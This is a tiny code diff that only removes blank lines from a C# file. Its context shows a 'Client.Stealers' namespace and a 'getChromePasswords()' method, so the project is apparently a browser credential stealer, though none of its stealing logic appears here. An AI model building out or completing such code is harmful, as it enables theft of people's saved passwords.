@@ -94,10 +94,6 @@ namespace Client.Stealers
             {
                 Debug.WriteLine($"[ERR] {e.ToString()}");
             }
-
-
-
-
         }
 
         public static void getChromePasswords()
